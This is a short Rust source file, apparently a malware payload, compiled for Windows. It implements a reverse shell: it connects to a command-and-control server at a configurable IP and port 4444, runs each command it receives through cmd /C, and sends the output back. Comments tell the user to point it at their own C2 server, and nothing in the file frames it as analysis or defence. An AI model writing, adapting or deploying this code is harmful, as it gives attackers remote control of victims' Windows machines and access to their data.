//manual compile: rustc --target=x86_64-pc-windows-gnu payload.rs

use std::net::TcpStream;
use std::io::{Read, Write};
use std::process::{Command, Stdio};

fn main() {
    // Change the IP address and port to match your C2 server
    let server_ip = "192.168.1.1";
    let server_port = "4444";

    // Connect to the C2 server
    let mut stream = match TcpStream::connect(format!("{}:{}", server_ip, server_port)) {
        Ok(stream) => stream,
        Err(e) => {
            eprintln!("Failed to connect to the server: {}", e);
            return;
        }
    };

    // Receive commands from the server and execute them
    loop {
        let mut command_buffer = [0; 512];
        match stream.read(&mut command_buffer) {
            Ok(n) => {
                if n == 0 {
                    // Connection closed by the server
                    println!("Connection closed by the server.");
                    break;
                }
                let command = String::from_utf8_lossy(&command_buffer[..n]);
                println!("Received command: {}", command);

                // Execute the command
                let output = Command::new("cmd")
                    .arg("/C")
                    .arg(command.trim())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()
                    .expect("Failed to execute command.");

                // Send the command output back to the server
                stream.write_all(&output.stdout).expect("Failed to send output to server.");
                stream.write_all(&output.stderr).expect("Failed to send error output to server.");
            }
            Err(e) => {
                eprintln!("Failed to receive data from the server: {}", e);
                break;
            }
        }
    }
}

